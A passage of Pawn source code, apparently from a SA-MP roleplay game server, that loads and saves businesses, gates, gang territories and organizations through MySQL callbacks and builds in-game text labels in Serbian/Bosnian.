        query, BusinessInfo[ bussinesID ][ bOwner_sqlID ], BusinessInfo[ bussinesID ][ bPrice ], BusinessInfo[ bussinesID ][ bType ], BusinessInfo[ bussinesID ][ bLocked ],
        BusinessInfo[ bussinesID ][ bMoney ], BusinessInfo[ bussinesID ][ bEnterX ], BusinessInfo[ bussinesID ][ bEnterY ], BusinessInfo[ bussinesID ][ bEnterZ ],
        BusinessInfo[ bussinesID ][ bExitX ], BusinessInfo[ bussinesID ][ bExitY ], BusinessInfo[ bussinesID ][ bExitZ ], BusinessInfo[ bussinesID ][ bInt ],
        BusinessInfo[ bussinesID ][ bVW ], BusinessInfo[ bussinesID ][ bInInt ], BusinessInfo[ bussinesID ][ bInVW ], BusinessInfo[ bussinesID ][ bName ],
        BusinessInfo[ bussinesID ][ bLevel ] );
    mysql_pquery( mSQL, query, "OnBussinesCreated", "i", bussinesID );

    Iter_Add(iter_Bizz, bussinesID);
	return 1;
}
_:public OnBussinesCreated( bussinesID )
{
	BusinessInfo[ bussinesID ][ b_ID ] = cache_insert_id();
	return 1;
}

_:public OnGatesLoad( )
{
	new rows, fields, gateID;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			gateID = Iter_Free(iter_Gate);

            GateData[ gateID ][ gatebaseID ] = cache_get_field_content_int( i, "gateid" );
			cache_get_field_content( i, "gateowner", GateData[ gateID ][ gateOwner ], mSQL, MAX_PLAYER_NAME );

			GateData[ gateID ][ gateModel ] = cache_get_field_content_int( i, "gatemodel" );
			GateData[ gateID ][ gateFor ] = cache_get_field_content_int( i, "gatefor" );
			GateData[ gateID ][ gateOrgID ] = cache_get_field_content_int( i, "gateorg" );
			GateData[ gateID ][ gateSpeed ] = cache_get_field_content_float( i, "gatespeed" );
			GateData[ gateID ][ gateRadius ] = cache_get_field_content_float( i, "gateradius" );
			GateData[ gateID ][ gateTime ] = cache_get_field_content_int( i, "gatetime" );

			GateData[ gateID ][ gatePos ][ 0 ] = cache_get_field_content_float( i, "gatepos_1" );
			GateData[ gateID ][ gatePos ][ 1 ] = cache_get_field_content_float( i, "gatepos_2" );
			GateData[ gateID ][ gatePos ][ 2 ] = cache_get_field_content_float( i, "gatepos_3" );
			GateData[ gateID ][ gatePos ][ 3 ] = cache_get_field_content_float( i, "gatepos_4" );
			GateData[ gateID ][ gatePos ][ 4 ] = cache_get_field_content_float( i, "gatepos_5" );
			GateData[ gateID ][ gatePos ][ 5 ] = cache_get_field_content_float( i, "gatepos_6" );

			GateData[ gateID ][ gateInterior ] = cache_get_field_content_int( i, "gateint" );
			GateData[ gateID ][ gateWorld ] = cache_get_field_content_int( i, "gatevw" );

			GateData[ gateID ][ gateMove ][ 0 ] = cache_get_field_content_float( i, "gatemove_1" );
			GateData[ gateID ][ gateMove ][ 1 ] = cache_get_field_content_float( i, "gatemove_2" );
			GateData[ gateID ][ gateMove ][ 2 ] = cache_get_field_content_float( i, "gatemove_3" );
			GateData[ gateID ][ gateMove ][ 3 ] = cache_get_field_content_float( i, "gatemove_4" );
			GateData[ gateID ][ gateMove ][ 4 ] = cache_get_field_content_float( i, "gatemove_5" );
			GateData[ gateID ][ gateMove ][ 5 ] = cache_get_field_content_float( i, "gatemove_6" );

            GateData[ gateID ][ gateOpened ] = false;
	        GateData[ gateID ][ gateObject ] = CreateDynamicObject( GateData[ gateID ][ gateModel ], GateData[ gateID ][ gatePos ][ 0 ], GateData[ gateID ][ gatePos ][ 1 ], GateData[ gateID ][ gatePos ][ 2 ], GateData[ gateID ][ gatePos ][ 3 ], GateData[ gateID ][ gatePos ][ 4 ], GateData[ gateID ][ gatePos ][ 5 ], GateData[ gateID ][ gateWorld ], GateData[ gateID ][ gateInterior ] );
		
	        Iter_Add(iter_Gate, gateID);
		}
	}
	printf("(U) SQL: Ucitao - Kapije(%d)", rows);
    return 1;
}

_:public sql_create_gate( g )
{
	new query[ 1024 ];
    mysql_format( mSQL, query, sizeof( query ), "INSERT INTO `gates` ( gateowner, gatemodel, gatefor, gateorg, gatespeed, gateradius, gatetime, \
					gatepos_1, gatepos_2, gatepos_3, gatepos_4, gatepos_5, gatepos_6, gateint, gatevw, gatemove_1, \
					gatemove_2, gatemove_3, gatemove_4, gatemove_5, gatemove_6)" );
    mysql_format( mSQL, query, sizeof( query ),	"%s VALUES( '%e', '%d', '%d', '%d', '%f', '%f', '%d', '%f', '%f', '%f', '%f', '%f', '%f', '%d', '%d', '%f', '%f', '%f', '%f', '%f', '%f' )",
        query, GateData[ g ][ gateOwner ],
      	GateData[ g ][ gateModel ], GateData[ g ][ gateFor ], GateData[ g ][ gateOrgID ], GateData[ g ][ gateSpeed ], GateData[ g ][ gateRadius ],
		GateData[ g ][ gateTime ], GateData[ g ][ gatePos ][ 0 ], GateData[ g ][ gatePos ][ 1 ], GateData[ g ][ gatePos ][ 2 ], GateData[ g ][ gatePos ][ 3 ],
		GateData[ g ][ gatePos ][ 4 ], GateData[ g ][ gatePos ][ 5 ], GateData[ g ][ gateInterior ], GateData[ g ][ gateWorld ], GateData[ g ][ gateMove ][ 0 ],
		GateData[ g ][ gateMove ][ 1 ], GateData[ g ][ gateMove ][ 2 ], GateData[ g ][ gateMove ][ 3 ], GateData[ g ][ gateMove ][ 4 ], GateData[ g ][ gateMove ][ 5 ] );
	mysql_pquery( mSQL, query, "OnGateCreated", "i", g );

	Iter_Add(iter_Gate, g);
	return 1;
}

_:public OnGateCreated( g )
{
	GateData[ g ][ gatebaseID ] = cache_insert_id();
	return 1;
}

//------------------------------------------------------------------------------

_:public sql_create_gangzone( id )
{
	new query[ 1024 ];
    mysql_format( mSQL, query, sizeof( query ), "INSERT INTO `gangzones` ( taken, takeable, is_special, gang_id, time, max_x, max_y, min_x, min_y, color, pickup_pos_x, pickup_pos_y, pickup_pos_z)" );
    mysql_format( mSQL, query, sizeof( query ),	"%s VALUES( '%d', '%d', '%d', '%d', '%d', '%f', '%f', '%f', '%f', '%e', '%f', '%f', '%f')",
        query, gZoneInfo[ id ][ gZoneTaken ], gZoneInfo[ id ][ gZoneTakeable ], gZoneInfo[id][gZoneIsSpecial], gZoneInfo[ id ][ gZoneGangSQLID ], gZoneInfo[ id ][ gZoneTime ],
		gZoneInfo[ id ][ gZoneMaxX ], gZoneInfo[ id ][ gZoneMaxY ], gZoneInfo[ id ][ gZoneMinX ], gZoneInfo[ id ][ gZoneMinY ], gZoneInfo[ id ][ gZoneColor ],
		gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ] );
	mysql_pquery( mSQL, query, "OnGangZoneCreated", "i", id );

	Iter_Add(iter_gZone, id);
	return 1;
}

_:public OnGangZoneCreated( g )
{
	gZoneInfo[ g ][ gZone_ID ] = cache_insert_id();
	return 1;
}

//------------------------------------------------------------------------------

_:public sql_create_organization( OrgID )
{
	new firma = 0;
	if( org_info[ OrgID ][ oEntFromBussines ] != -1 ) firma = BusinessInfo[ org_info[ OrgID ][ oEntFromBussines ] ][ b_ID ];
	else firma = 0;

	new query[ 1024 ];
	mysql_format( mSQL, query, sizeof( query ), "INSERT INTO `organizations` (name, prefix, type, max_members, male_skin_1, male_skin_2, male_skin_3, male_skin_4, male_skin_5, male_skin_6, \
			female_skin_1, female_skin_2, female_skin_3, female_skin_4, female_skin_5, female_skin_6, rank_1, rank_2, rank_3, rank_4, rank_5, rank_6, \
			enter_pos_x, enter_pos_y, enter_pos_z, exit_pos_x, exit_pos_y, exit_pos_z, interior, virtualw, ent_bussines )" );
	mysql_format( mSQL, query, sizeof( query ),	"%s VALUES( '%e', '%e', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%d', '%e', '%e', '%e', '%e', '%e', '%e', '%f', '%f', '%f', '%f', '%f', '%f', '%d', '%d', '%d' )",
		query, org_info[ OrgID ][ oName ],  org_info[ OrgID ][ oPreFix ], org_info[ OrgID ][ oTip ], org_info[ OrgID ][ oMaxClanova ],
		org_info[ OrgID ][ oSkin1 ], org_info[ OrgID ][ oSkin2 ], org_info[ OrgID ][ oSkin3 ], org_info[ OrgID ][ oSkin4 ], org_info[ OrgID ][ oSkin5 ], org_info[ OrgID ][ oSkin6 ],
		org_info[ OrgID ][ oZSkin1 ], org_info[ OrgID ][ oZSkin2 ], org_info[ OrgID ][ oZSkin3 ], org_info[ OrgID ][ oZSkin4 ], org_info[ OrgID ][ oZSkin5 ], org_info[ OrgID ][ oZSkin6 ],
		org_info[ OrgID ][ oRank1 ], org_info[ OrgID ][ oRank2 ], org_info[ OrgID ][ oRank3 ], org_info[ OrgID ][ oRank4 ], org_info[ OrgID ][ oRank5 ], org_info[ OrgID ][ oRank6 ],
		org_info[ OrgID ][ oPozExtX ], org_info[ OrgID ][ oPozExtY ], org_info[ OrgID ][ oPozExtZ ],
		org_info[ OrgID ][ oPozIntX ], org_info[ OrgID ][ oPozIntY ], org_info[ OrgID ][ oPozIntZ ],
		org_info[ OrgID ][ oInt ], org_info[ OrgID ][ oVw ], firma );
	mysql_pquery( mSQL, query, "OnOrganizationCreated", "i", OrgID );
	return 1;
}

_:public OnOrganizationCreated( OrgID )
{
	org_info[ OrgID ][ oID ] = cache_insert_id();
	return 1;
}

//------------------------------------------------------------------------------

_:public OnBussinesLoad( )
{
	new rows, fields, f;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
		    f = Iter_Free(iter_Bizz);

		    BusinessInfo[ f ][ b_ID ] = cache_get_field_content_int( i, "bussines_id" );
			BusinessInfo[ f ][ bOwner_sqlID ] = cache_get_field_content_int( i, "b_owner_sqlID" );
			BusinessInfo[ f ][ bOnAuction ] = bool:cache_get_field_content_int( i, "bOnAuction" );
			BusinessInfo[ f ][ bPrice ] = cache_get_field_content_int( i, "b_price" );
			BusinessInfo[ f ][ bType ] = cache_get_field_content_int( i, "b_type" );
			BusinessInfo[ f ][ bLocked ] = cache_get_field_content_int( i, "b_locked" );
			BusinessInfo[ f ][ bMoney ] = cache_get_field_content_int( i, "b_money" );
			BusinessInfo[ f ][ bEnterX ] = cache_get_field_content_float( i, "b_enter_x" );
			BusinessInfo[ f ][ bEnterY ] = cache_get_field_content_float( i, "b_enter_y" );
			BusinessInfo[ f ][ bEnterZ ] = cache_get_field_content_float( i, "b_enter_z" );
			BusinessInfo[ f ][ bExitX ] = cache_get_field_content_float( i, "b_exit_x" );
			BusinessInfo[ f ][ bExitY ] = cache_get_field_content_float( i, "b_exit_y" );
			BusinessInfo[ f ][ bExitZ ] = cache_get_field_content_float( i, "b_exit_z" );
			BusinessInfo[ f ][ bInt ] = cache_get_field_content_int( i, "b_enter_int" );
			BusinessInfo[ f ][ bVW ] = cache_get_field_content_int( i, "b_enter_vw" );
			BusinessInfo[ f ][ bInInt ] = cache_get_field_content_int( i, "b_exit_int" );
			BusinessInfo[ f ][ bInVW ] = cache_get_field_content_int( i, "b_exit_vw" );
			BusinessInfo[ f ][ bLevel ] = cache_get_field_content_int( i, "b_level" );
			BusinessInfo[ f ][ bJobID ] = cache_get_field_content_int( i, "b_jobID" );
			BusinessInfo[ f ][ bNeaktivnost ] = cache_get_field_content_int( i, "b_neaktivnost" );
			BusinessInfo[ f ][ bFacture ] = cache_get_field_content_int( i, "b_facture" );
			BusinessInfo[ f ][ bOwnerOrg ] = -1;

			cache_get_field_content( i, "b_name", BusinessInfo[ f ][ bName ], mSQL, 64 );
			cache_get_field_content( i, "bOwner", BusinessInfo[ f ][ bOwner ], mSQL, 24 );

			new string[ 250 ];
		    if( BusinessInfo[ f ][ bOwner_sqlID ] == -1 )
			{
		        if( !BusinessInfo[ f ][ bOnAuction ] )
				{
					format(string,sizeof(string),
						"(FIRMA - [%d])\n\
						{B72C40}Ime: {FFFFFF}%s\n\
						{B72C40}Cena: {FFFFFF}$%d\n\
						{B72C40}Vrsta: {FFFFFF}%s\n\
						{B72C40}Level: {FFFFFF}%d\n\
						{B72C40}Adresa: {FFFFFF}%s\n\
						{B72C40}[ /kupifirmu ]", f, BusinessInfo[ f ][ bName ], BusinessInfo[ f ][ bPrice ], getBussinesType( f ), BusinessInfo[ f ][ bLevel ], UliceFirme( f ) );
				}
				else
				{
					format(string,sizeof(string),
						"(FIRMA - [%d])\n\
						{B72C40}Ime: {FFFFFF}%s\n\
						{B72C40}Cena: {FFFFFF}$%d\n\
						{B72C40}Vrsta: {FFFFFF}%s\n\
						{B72C40}Level: {FFFFFF}%d\n\
						{B72C40}Adresa: {FFFFFF}%s\n\
						{B72C40}[ {00FF00}NA AUKCIJI {B72C40}]", f, BusinessInfo[ f ][ bName ], BusinessInfo[ f ][ bPrice ], getBussinesType( f ), BusinessInfo[ f ][ bLevel ], UliceFirme( f ) );
				}

			}
			else
			{
			    format(string,sizeof(string),
					"(FIRMA - [%d])\n\
					Ime: {FFFFFF}%s\n\
					{B72C40}Vlasnik: {FFFFFF}%s\n\
					{B72C40}Vrsta: {FFFFFF}%s\n\
					{B72C40}Adresa: {FFFFFF}%s\n\
					{B72C40}Neaktivnost: {FFFFFF}%dh\n\
					{B72C40}Fakture: {FFFFFF}%d",
						f, BusinessInfo[ f ][ bName ], BusinessInfo[ f ][ bOwner ], getBussinesType( f ), UliceFirme( f ), BusinessInfo[ f ][ bNeaktivnost ], BusinessInfo[ f ][ bFacture ]);

			}
			FirmaLabel[ f ] = CreateDynamic3DTextLabel( string, 0xB72C40FF, BusinessInfo[ f ][ bEnterX ], BusinessInfo[ f ][ bEnterY ], BusinessInfo[ f ][ bEnterZ ], 10.0, IPI, IVI, 0, -1, -1, .priority = 26);
			FirmaPickup[ f ] = CreateDynamicPickup( 1274, 1, BusinessInfo[ f ][ bEnterX], BusinessInfo[ f ][ bEnterY], BusinessInfo[ f ][ bEnterZ ], .priority = 26 );

			Iter_Add(iter_Bizz, f);
		}
	}
	printf("(U) SQL: Ucitao - Firme(%d)", rows);
	CreateBizzIcons();
    return 1;
}

//------------------------------------------------------------------------------

_:public GZone_Reset( id ) 
{
    gZoneInfo[ id ][ gZoneTaken ] = 0;
	gZoneInfo[ id ][ gZoneTakeable ] = 0;
	gZoneInfo[ id ][ gZoneGangSQLID ] = 0;
    gZoneInfo[ id ][ gZoneGangID ] = -1;
    gZoneInfo[ id ][ gZoneTime ] = 0;
    gZoneInfo[ id ][ gZoneMaxX ] = 0.0;
    gZoneInfo[ id ][ gZoneMinX ] = 0.0;
    gZoneInfo[ id ][ gZoneMaxY ] = 0.0;
    gZoneInfo[ id ][ gZoneMinY ] = 0.0;
    gZoneInfo[ id ][ gZonePickup_X ] = 0.0;
    gZoneInfo[ id ][ gZonePickup_Y ] = 0.0;
    gZoneInfo[ id ][ gZonePickup_Z ] = 0.0;
    gZoneInfo[id][gZoneIsSpecial] = 0;
}

GetNearestGZone( playerid ) 
{
	new Float:Pos[ 4 ];
	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
    foreach(new id : iter_gZone)
    {
		if( Pos[ 0 ] <= gZoneInfo[ id ][ gZoneMaxX ] && Pos[ 0 ] >= gZoneInfo[ id ][ gZoneMinX ] && Pos[ 1 ] <= gZoneInfo[ id ][ gZoneMaxY ] && Pos[ 1 ] >= gZoneInfo[ id ][ gZoneMinY ] )
		{
			return id;
		}
	}
	return -1;
}

_:public GZone_Refresh( id )
{
	if( id != -1 )
	{
		if( gZoneInfo[ id ][ gZone_ID ] > 0 )
		{
		    if( IsValidDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] ) ) DestroyDynamic3DTextLabel( gZoneInfo[ id ][ gZone3D ] );
	    	if( IsValidDynamicPickup( gZoneInfo[ id ][ gZonePickup ] ) ) DestroyDynamicPickup( gZoneInfo[ id ][ gZonePickup ] );

			new string[ 150 ];
	    	if(gZoneInfo[id][gZoneIsSpecial] == 1) 
	    	{
				if( !gZoneInfo[ id ][ gZoneTaken ] )
				{
					gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 0, 0, .priority = 28 );
					format(string, 120, "(SPECIJALNA TERITORIJA - [%d])\nTeritorija je {FFFFFF}slobodna.\n{EB4034}Ako zelite da je zauzmete kucajte {FFFFFF}\"/zauzmi\"", id);
					gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel(string, 0xEB4034FF, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
				}
				else if( gZoneInfo[ id ][ gZoneTaken ] )
				{
				    gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 0, 0, .priority = 28 );
				    format( string, 150, "(SPECIJALNA TERITORIJA - [%d])\nTeritorija je u posjedu {FFFFFF}%s.\n{EB4034}Ako zelite da zauzmete kucajte {FFFFFF}\"/zauzmi\"", id, org_info[ gZoneInfo[ id ][ gZoneGangID ] ][ oName ] );
				    gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
				}
	    	}
	    	else 
	    	{
				if( !gZoneInfo[ id ][ gZoneTaken ] )
				{
					gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 0, 0, .priority = 28 );
					format(string, 120, "(OBICNA TERITORIJA - [%d])\nTeritorija je {FFFFFF}slobodna.\n{EB4034}Ako zelite da je zauzmete kucajte {FFFFFF}\"/zauzmi\"", id);
					gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel(string, 0xEB4034FF, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
				}
				else if( gZoneInfo[ id ][ gZoneTaken ] )
				{
				    gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 0, 0, .priority = 28 );
				    format( string, 150,"(OBICNA TERITORIJA - [%d])\nTeritorija je u posjedu {FFFFFF}%s.\n{EB4034}Ako zelite da zauzmete kucajte {FFFFFF}\"/zauzmi\"",
							id, org_info[ gZoneInfo[ id ][ gZoneGangID ] ][ oName ] );
				    gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ id ][ gZonePickup_X ], gZoneInfo[ id ][ gZonePickup_Y ], gZoneInfo[ id ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
				}	    		
	    	}
		}
	}
}

_:public OnGangZonesLoad()
{
    new rows, fields, gangzID, OrgID = -1, string[ 150 ];
    cache_get_data( rows, fields, mSQL );
	if( rows )
	{
        for( new i = 0; i < rows; i ++ )
		{
            gangzID = Iter_Free(iter_gZone);

			gZoneInfo[ gangzID ][ gZone_ID ] = cache_get_field_content_int( i, "gzone_id" );
            gZoneInfo[ gangzID ][ gZoneTaken ] = cache_get_field_content_int( i, "taken" );
		    gZoneInfo[ gangzID ][ gZoneTakeable ] = cache_get_field_content_int( i, "takeable" );
		    gZoneInfo[ gangzID ][ gZoneGangSQLID ] = cache_get_field_content_int( i, "gang_id" );
		    gZoneInfo[ gangzID ][ gZoneTime ] = cache_get_field_content_int( i, "time" );

			gZoneInfo[ gangzID ][ gZoneMaxX ] = cache_get_field_content_float( i, "max_x");
		    gZoneInfo[ gangzID ][ gZoneMinX ] = cache_get_field_content_float( i, "min_x");
		    gZoneInfo[ gangzID ][ gZoneMaxY ] = cache_get_field_content_float( i, "max_y");
		    gZoneInfo[ gangzID ][ gZoneMinY ] = cache_get_field_content_float( i, "min_y");

		    cache_get_field_content( i, "color", gZoneInfo[ gangzID ][ gZoneColor ], mSQL, 24 );

		    gZoneInfo[ gangzID ][ gZonePickup_X ] = cache_get_field_content_float( i, "pickup_pos_x");
		    gZoneInfo[ gangzID ][ gZonePickup_Y ] = cache_get_field_content_float( i, "pickup_pos_y");
		    gZoneInfo[ gangzID ][ gZonePickup_Z ] = cache_get_field_content_float( i, "pickup_pos_z");

		    gZoneInfo[gangzID][gZoneIsSpecial] = cache_get_field_content_int(i, "is_special");

		    gZoneInfo[ gangzID ][ gZoneGangID ] = -1;
		    OrgID = -1;

		    for( new j = 1; j < MAX_ORG; j++) 
		    {
		        if( org_info[ j ][ oID ] == gZoneInfo[ gangzID ][ gZoneGangSQLID ] ) 
		        {
		            OrgID = j;
		            break;
		        }
			}

            if( OrgID != -1 ) 
            {
            	gZoneInfo[ gangzID ][ gZoneGangID ] = OrgID;
            	gZoneInfo[ gangzID ][ gZoneTime ] = 0;

	            if(gZoneInfo[gangzID][gZoneIsSpecial] == 1) 
	            {
					if( gZoneInfo[ gangzID ][ gZoneTaken ] )
					{
						gZoneInfo[ gangzID ][ gZoneID ] = CreateZone( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ] );
			            gZoneInfo[ gangzID ][ gZoneRectAngle ] = CreateDynamicRectangle( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ], -1, -1, -1 );
			            CreateZoneBorders(gZoneInfo[ gangzID ][ gZoneID ]);
			            CreateZoneNumber(gZoneInfo[ gangzID ][ gZoneID ], gangzID);
					   
					    gZoneInfo[ gangzID ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 0, 0, .priority = 28 );
					    format( string, sizeof( string ), "(SPECIJALNA TERITORIJA - [%d])\nTeritorija je u posjedu {FFFFFF}%s.\n{EB4034}Ako zelite da zauzmete kucajte {FFFFFF}\"/zauzmi\"", gangzID, org_info[ gZoneInfo[ gangzID ][ gZoneGangID ] ][ oName ] );
					    gZoneInfo[ gangzID ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
					}
					else 
					{
						gZoneInfo[ gangzID ][ gZoneID ] = CreateZone( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ] );
			            gZoneInfo[ gangzID ][ gZoneRectAngle ] = CreateDynamicRectangle( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ], -1, -1, -1 );
			            CreateZoneBorders(gZoneInfo[ gangzID ][ gZoneID ]);
			            CreateZoneNumber(gZoneInfo[ gangzID ][ gZoneID ], gangzID);
					   
						gZoneInfo[ gangzID ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 0, 0, .priority = 28 );
						format( string, sizeof(string), "(SPECIJALNA TERITORIJA - [%d])\nTeritorija je {FFFFFF}slobodna.\n{EB4034}Ako zelite da je zauzmete kucajte {FFFFFF}\"/zauzmi\"", gangzID);
						gZoneInfo[ gangzID ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
					}
	            }
	            else 
	            {
					if( gZoneInfo[ gangzID ][ gZoneTaken ] )
					{
						gZoneInfo[ gangzID ][ gZoneID ] = CreateZone( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ] );
			            gZoneInfo[ gangzID ][ gZoneRectAngle ] = CreateDynamicRectangle( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ], -1, -1, -1 );
			            CreateZoneBorders(gZoneInfo[ gangzID ][ gZoneID ]);
			            CreateZoneNumber(gZoneInfo[ gangzID ][ gZoneID ], gangzID);
					   
					    gZoneInfo[ gangzID ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 0, 0, .priority = 28 );
					    format( string, sizeof( string ), "(OBICNA TERITORIJA - [%d])\nTeritorija je u posjedu {FFFFFF}%s.\n{EB4034}Ako zelite da zauzmete kucajte {FFFFFF}\"/zauzmi\"", gangzID, org_info[ gZoneInfo[ gangzID ][ gZoneGangID ] ][ oName ] );
					    gZoneInfo[ gangzID ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
					}
					else 
					{
						gZoneInfo[ gangzID ][ gZoneID ] = CreateZone( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ] );
			            gZoneInfo[ gangzID ][ gZoneRectAngle ] = CreateDynamicRectangle( gZoneInfo[ gangzID ][ gZoneMinX ], gZoneInfo[ gangzID ][ gZoneMinY ], gZoneInfo[ gangzID ][ gZoneMaxX ], gZoneInfo[ gangzID ][ gZoneMaxY ], -1, -1, -1 );
			            CreateZoneBorders(gZoneInfo[ gangzID ][ gZoneID ]);
			            CreateZoneNumber(gZoneInfo[ gangzID ][ gZoneID ], gangzID);
					   
						gZoneInfo[ gangzID ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 0, 0, .priority = 28 );
						format( string, sizeof(string), "(OBICNA TERITORIJA - [%d])\nTeritorija je {FFFFFF}slobodna.\n{EB4034}Ako zelite da je zauzmete kucajte {FFFFFF}\"/zauzmi\"", gangzID);
						gZoneInfo[ gangzID ][ gZone3D ] = CreateDynamic3DTextLabel( string, 0xEB4034FF, gZoneInfo[ gangzID ][ gZonePickup_X ], gZoneInfo[ gangzID ][ gZonePickup_Y ], gZoneInfo[ gangzID ][ gZonePickup_Z ], 15.0, IPI, IVI, 0, 0, 0, .priority = 28 );
					}
	            }
	        }

            Iter_Add(iter_gZone, gangzID);
        }
    }
	printf("(U) SQL: Ucitao - Teritorije(%d)", rows);
    return 1;
}

_:public OnOrganizationsLoad( )
{
	new rows, fields, OrgID, OrgCounter = 1;
    cache_get_data( rows, fields, mSQL );

	if( rows )
	{
		for( new i = 0; i < rows; i ++ )
		{
			OrgID = OrgCounter;

            org_info[ OrgID ][ oID ] = cache_get_field_content_int( i, "org_id" );
            cache_get_field_content( i, "name", org_info[ OrgID ][ oName ], mSQL, ORG_IME );
			cache_get_field_content( i, "prefix", org_info[ OrgID ][ oPreFix ], mSQL, 5 );
			cache_get_field_content( i, "color", org_info[ OrgID ][ oColor ], mSQL, 7 );

			org_info[ OrgID ][ oTip ]  = cache_get_field_content_int( i, "type" );
			org_info[ OrgID ][ oSuspended ] = cache_get_field_content_int( i, "suspended" );
			org_info[ OrgID ][ oMaxClanova ] = cache_get_field_content_int( i, "max_members" );
		    org_info[ OrgID ][ oUbacenihClanova ] = 0;

		    org_info[ OrgID ][ oSkin1 ] = cache_get_field_content_int( i, "male_skin_1" );
			org_info[ OrgID ][ oSkin2 ] = cache_get_field_content_int( i, "male_skin_2" );
			org_info[ OrgID ][ oSkin3 ] = cache_get_field_content_int( i, "male_skin_3" );
			org_info[ OrgID ][ oSkin4 ] = cache_get_field_content_int( i, "male_skin_4" );
			org_info[ OrgID ][ oSkin5 ] = cache_get_field_content_int( i, "male_skin_5" );
			org_info[ OrgID ][ oSkin6 ] = cache_get_field_content_int( i, "male_skin_6" );

			org_info[ OrgID ][ oZSkin1 ] = cache_get_field_content_int( i, "female_skin_1" );
